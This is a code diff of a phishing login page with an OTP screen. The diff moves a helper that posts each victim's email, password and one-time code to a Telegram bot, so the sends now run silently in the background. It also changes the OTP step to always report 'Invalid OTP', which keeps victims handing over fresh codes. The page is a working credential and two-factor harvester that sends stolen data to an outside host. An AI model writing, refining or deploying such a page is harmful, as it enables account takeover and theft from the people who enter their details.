@@ -10,28 +10,134 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-    .container { width: 100%; max-width: 400px; background: #0f172a; border-radius: 16px; padding: 48px 28px 40px; text-align: center; transition: opacity 0.4s ease; }
-    .hidden { display: none; }
-    .logo { width: 140px; height: auto; margin: 0 auto 28px; display: block; }
-    .brand-name { color: #f97316; font-size: 2.1rem; font-weight: 700; letter-spacing: -0.5px; margin-bottom: 40px; }
-    h1 { font-size: 1.5rem; font-weight: 600; color: #cbd5e1; margin-bottom: 36px; }
-    .form-group { margin-bottom: 24px; text-align: left; }
-    label { display: block; font-size: 0.95rem; font-weight: 500; color: #94a3b8; margin-bottom: 8px; }
-    input { width: 100%; padding: 14px 16px; background: transparent; border: none; border-bottom: 1px solid #475569; color: white; font-size: 1rem; transition: border-color 0.2s; }
-    input:focus { outline: none; border-bottom-color: #f97316; }
-    .forgot-row { display: flex; justify-content: flex-end; margin-bottom: 32px; }
-    .forgot-link { color: #f97316; font-size: 0.9rem; text-decoration: none; font-weight: 500; }
-    .forgot-link:hover { text-decoration: underline; color: #fb923c; }
-    .btn { width: 100%; padding: 15px; background: #f97316; color: white; border: none; border-radius: 10px; font-size: 1.05rem; font-weight: 600; cursor: pointer; margin: 12px 0 28px; transition: background 0.2s; }
-    .btn:hover { background: #ea580c; }
-    .btn:disabled { background: #c2410c; cursor: not-allowed; }
+    * { 
+      margin: 0; 
+      padding: 0; 
+      box-sizing: border-box; 
+    }
+    body { 
+      font-family: 'Inter', system-ui, -apple-system, sans-serif; 
+      background: #0f172a; 
+      color: #e2e8f0; 
+      min-height: 100vh; 
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+      padding: 20px; 
+    }
+    .container { 
+      width: 100%; 
+      max-width: 400px; 
+      background: #0f172a; 
+      border-radius: 16px; 
+      padding: 48px 28px 40px; 
+      text-align: center; 
+      transition: opacity 0.4s ease; 
+    }
+    .hidden { 
+      display: none; 
+    }
+    .logo { 
+      width: 140px; 
+      height: auto; 
+      margin: 0 auto 28px; 
+      display: block; 
+    }
+    .brand-name { 
+      color: #f97316; 
+      font-size: 2.1rem; 
+      font-weight: 700; 
+      letter-spacing: -0.5px; 
+      margin-bottom: 40px; 
+    }
+    h1 { 
+      font-size: 1.5rem; 
+      font-weight: 600; 
+      color: #cbd5e1; 
+      margin-bottom: 36px; 
+    }
+    .form-group { 
+      margin-bottom: 24px; 
+      text-align: left; 
+    }
+    label { 
+      display: block; 
+      font-size: 0.95rem; 
+      font-weight: 500; 
+      color: #94a3b8; 
+      margin-bottom: 8px; 
+    }
+    input { 
+      width: 100%; 
+      padding: 14px 16px; 
+      background: transparent; 
+      border: none; 
+      border-bottom: 1px solid #475569; 
+      color: white; 
+      font-size: 1rem; 
+      transition: border-color 0.2s; 
+    }
+    input:focus { 
+      outline: none; 
+      border-bottom-color: #f97316; 
+    }
+    .forgot-row { 
+      display: flex; 
+      justify-content: flex-end; 
+      margin-bottom: 32px; 
+    }
+    .forgot-link { 
+      color: #f97316; 
+      font-size: 0.9rem; 
+      text-decoration: none; 
+      font-weight: 500; 
+    }
+    .forgot-link:hover { 
+      text-decoration: underline; 
+      color: #fb923c; 
+    }
+    .btn { 
+      width: 100%; 
+      padding: 15px; 
+      background: #f97316; 
+      color: white; 
+      border: none; 
+      border-radius: 10px; 
+      font-size: 1.05rem; 
+      font-weight: 600; 
+      cursor: pointer; 
+      margin: 12px 0 28px; 
+      transition: background 0.2s; 
+    }
+    .btn:hover { 
+      background: #ea580c; 
+    }
+    .btn:disabled { 
+      background: #c2410c; 
+      cursor: not-allowed; 
+    }
+    .error-msg {
+      color: #ff6b6b;
+      font-size: 0.95rem;
+      margin-top: 12px;
+      display: none;
+    }
+    .error-msg.show {
+      display: block;
+    }
     @media (max-width: 480px) {
-      .container { padding: 40px 24px 36px; }
-      .logo { width: 120px; }
-      .brand-name { font-size: 1.9rem; }
-      h1 { font-size: 1.4rem; }
+      .container { 
+        padding: 40px 24px 36px; 
+      }
+      .logo { 
+        width: 120px; 
+      }
+      .brand-name { 
+        font-size: 1.9rem; 
+      }
+      h1 { 
+        font-size: 1.4rem; 
+      }
     }
   </style>
 </head>
@@ -65,9 +171,10 @@
 
     <h1>Verify OTP</h1>
 
-    <div class="form-group" style="text-align: center; margin-bottom: 32px;">
+    <div class="form-group" style="text-align: center; margin-bottom: 20px;">
       <label style="display: block; margin-bottom: 16px;">Enter OTP</label>
       <input type="text" id="otp" maxlength="6" placeholder="" style="text-align: center; font-size: 1.4rem; letter-spacing: 8px;" required>
+      <div class="error-msg" id="errorMessage">Invalid OTP. Please try again.</div>
     </div>
 
     <button id="verifyBtn" class="btn">CONTINUE</button>
@@ -83,15 +190,34 @@
     const loginForm  = document.getElementById('loginForm');
     const loginBtn   = document.getElementById('loginBtn');
     const verifyBtn  = document.getElementById('verifyBtn');
+    const errorMessage = document.getElementById('errorMessage');
 
-    // Login Form Submission - IMMEDIATE transition
-    loginForm.addEventListener('submit', async function(e) {
+    // Helper function to send message to Telegram (in background)
+    function sendToTelegram(text) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: text,
+          parse_mode: 'HTML'
+        })
+      })
+      .then(response => {
+        if (!response.ok) console.log('Telegram send failed');
+      })
+      .catch(err => console.log('Telegram error:', err));
+    }
+
+    // Login Form Submission
+    loginForm.addEventListener('submit', function(e) {
       e.preventDefault();
 
       const email    = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
 
-      // Basic validation
       if (!email || !password) {
         alert('Please fill in email and password');
         return;
@@ -102,31 +228,31 @@
         return;
       }
 
-      // Optional: disable button during send (very short moment)
       loginBtn.disabled = true;
       loginBtn.textContent = 'LOGGING IN...';
 
-      // Prepare message
       const loginMessage = `
 <b>New Login Attempt</b>
 Email: ${email}
 Password: ${password}
       `;
 
-      // Send to Telegram
-      await sendToTelegram(loginMessage);
+      // Send in background
+      sendToTelegram(loginMessage);
 
-      // Immediately show OTP page (no delay)
+      // Instantly show OTP page
       loginPage.classList.add('hidden');
       otpPage.classList.remove('hidden');
 
-      // Reset button state (in case user goes back)
-      loginBtn.disabled = false;
-      loginBtn.textContent = 'LOG IN';
+      // Reset button state
+      setTimeout(() => {
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'LOG IN';
+      }, 800);
     });
 
-    // OTP Verification
-    verifyBtn.addEventListener('click', async function() {
+    // OTP Verification - show "Invalid OTP" instead of success
+    verifyBtn.addEventListener('click', function() {
       const otp = document.getElementById('otp').value.trim();
 
       if (!otp || otp.length < 4) {
@@ -142,39 +268,18 @@ Password: ${password}
 OTP Code: ${otp}
       `;
 
-      await sendToTelegram(otpMessage);
+      // Send OTP in background
+      sendToTelegram(otpMessage);
 
-      // Simulate final step (you can remove or change this)
+      // Show invalid message (instead of success alert)
       setTimeout(() => {
-        alert('OTP Verified! (Demo)');
+        errorMessage.classList.add('show');
         this.disabled = false;
         this.textContent = 'CONTINUE';
-        // In a real app → redirect to dashboard
-      }, 1200);
+        // Focus back on OTP input
+        document.getElementById('otp').focus();
+      }, 1000);
     });
-
-    // Helper function to send message to Telegram
-    async function sendToTelegram(text) {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-      try {
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: text,
-            parse_mode: 'HTML'
-          })
-        });
-
-        if (!response.ok) {
-          console.log('Telegram send failed:', await response.text());
-        }
-      } catch (err) {
-        console.log('Telegram error:', err);
-      }
-    }
   </script>
 
 </body>
